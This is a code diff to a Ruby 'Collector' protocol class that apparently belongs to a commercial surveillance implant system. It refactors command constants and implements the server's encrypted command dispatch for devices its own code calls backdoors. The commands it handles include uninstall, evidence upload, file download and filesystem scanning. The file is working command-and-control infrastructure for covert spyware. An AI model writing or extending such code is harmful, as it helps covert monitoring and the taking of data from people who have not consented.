@@ -3,8 +3,9 @@
 #
 
 # relatives
-require_relative 'session.rb'
+require_relative 'sessions.rb'
 require_relative 'db.rb'
+require_relative 'commands.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -20,21 +21,7 @@ module Collector
 class Protocol
   extend RCS::Tracer
   extend RCS::Crypt
-
-  INVALID_COMMAND  = 0x00       # Don't use
-  PROTO_OK         = 0x01       # OK
-  PROTO_NO         = 0x02       # Nothing available
-  PROTO_BYE        = 0x03       # The end of the protocol
-  PROTO_CHALLENGE  = 0x04       # Authentication
-  PROTO_ID         = 0x0f       # Identification of the target
-  PROTO_CONF       = 0x07       # New configuration
-  PROTO_UNINSTALL  = 0x0a       # Uninstall command
-  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
-  PROTO_UPLOAD     = 0x0d       # A file to be saved
-  PROTO_EVIDENCE   = 0x09       # Upload of a log
-  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
-
-  # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
+  extend RCS::Collector::Commands
 
   # Authentication phase
   # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
@@ -65,15 +52,15 @@ class Protocol
 
     # the build_id identification
     build_id = message.slice!(0..15)
-    trace :debug, "[#{peer}] Auth -- BuildId: " << build_id
+    trace :info, "[#{peer}] Auth -- BuildId: " << build_id
 
     # instance of the device
     instance_id = message.slice!(0..19)
-    trace :debug, "[#{peer}] Auth -- InstanceId: " << instance_id.unpack('H*').to_s
+    trace :info, "[#{peer}] Auth -- InstanceId: " << instance_id.unpack('H*').to_s
 
     # subtype of the device
     subtype = message.slice!(0..15)
-    trace :debug, "[#{peer}] Auth -- subtype: " << subtype
+    trace :info, "[#{peer}] Auth -- subtype: " << subtype
 
     # identification digest
     sha = message.slice!(0..19)
@@ -121,11 +108,11 @@ class Protocol
     # what to do based on the backdoor status
     case status
       when DB::DELETED_BACKDOOR, DB::NO_SUCH_BACKDOOR, DB::CLOSED_BACKDOOR
-        response = [PROTO_UNINSTALL].pack('i')
+        response = [Commands::PROTO_UNINSTALL].pack('i')
         trace :info, "[#{peer}] Uninstall command sent"
       when DB::ACTIVE_BACKDOOR
         # everything is ok
-        response = [PROTO_OK].pack('i')
+        response = [Commands::PROTO_OK].pack('i')
 
         # create a valid cookie session
         cookie = SessionManager.instance.create(bid, build_id, instance_id, subtype, k)
@@ -146,9 +133,9 @@ class Protocol
     valid = SessionManager.instance.check(cookie)
 
     if valid then
-      trace :info, "[#{peer}] [#{cookie}] Authenticated"
+      trace :debug, "[#{peer}][#{cookie}] Authenticated"
     else
-      trace :warn, "[#{peer}] [#{cookie}] Invalid cookie"
+      trace :warn, "[#{peer}][#{cookie}] Invalid cookie"
     end
 
     return valid
@@ -156,8 +143,41 @@ class Protocol
 
   
   def self.commands(peer, cookie, content)
-    trace :debug, "COMMANDS"
-    return
+    # retrieve the session
+    session = SessionManager.instance.get cookie
+
+    # invalid session
+    if session.nil?
+      trace :warn, "[#{peer}][#{cookie}] Invalid session"
+      return
+    end
+
+    # decrypt the message
+    begin
+      message = aes_decrypt(content, session[:key])
+    rescue
+      trace :error, "[#{peer}][#{cookie}] Invalid message decryption"
+      return
+    end
+
+    # get the command (slicing the message)
+    command = message.slice!(0..3)
+
+    # retrieve the type of the command
+    command = command.unpack('i').first.to_i
+
+    # invoke the right method for parsing
+    if !Commands::LOOKUP[command].nil? then
+      response = self.send Commands::LOOKUP[command], peer, session, message
+    else
+      trace :warn, "[#{peer}][#{cookie}] unknown command [#{command}]"
+      return
+    end
+    
+    # crypt the message with the session key
+    response = aes_encrypt(response, session[:key])
+
+    return response, 'application/octet-stream'
   end
 
   # the protocol is parsed here
